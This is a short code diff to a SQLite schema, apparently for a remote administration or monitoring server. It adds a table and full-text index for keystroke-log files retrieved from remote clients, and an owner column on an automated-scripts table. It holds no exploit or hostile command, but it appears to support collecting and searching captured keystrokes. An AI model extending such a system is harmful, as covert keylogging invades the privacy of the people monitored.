@@ -236,6 +236,33 @@ db.run(
 );
 
 db.run(`
+  CREATE TABLE IF NOT EXISTS keylog_archive_files (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    client_id TEXT NOT NULL,
+    filename TEXT NOT NULL,
+    size INTEGER NOT NULL DEFAULT 0,
+    modified_at INTEGER,
+    retrieved_at INTEGER NOT NULL,
+    content TEXT NOT NULL DEFAULT '',
+    UNIQUE(client_id, filename)
+  );
+`);
+db.run(`CREATE INDEX IF NOT EXISTS idx_keylog_archive_client ON keylog_archive_files(client_id, retrieved_at DESC);`);
+db.run(`CREATE INDEX IF NOT EXISTS idx_keylog_archive_retrieved ON keylog_archive_files(retrieved_at);`);
+
+try {
+  db.run(`
+    CREATE VIRTUAL TABLE IF NOT EXISTS keylog_archive_fts USING fts5(
+      file_id UNINDEXED,
+      client_id UNINDEXED,
+      filename,
+      content,
+      tokenize = 'unicode61'
+    );
+  `);
+} catch {}
+
+db.run(`
   CREATE TABLE IF NOT EXISTS revoked_tokens (
     token_hash TEXT PRIMARY KEY,
     expires_at INTEGER NOT NULL
@@ -389,6 +416,9 @@ db.run(
 );
 try {
   db.run(`ALTER TABLE auto_scripts ADD COLUMN os_filter TEXT NOT NULL DEFAULT '[]'`);
+} catch { /* column already exists */ }
+try {
+  db.run(`ALTER TABLE auto_scripts ADD COLUMN created_by_user_id INTEGER`);
 } catch { /* column already exists */ }
 
 db.run(`
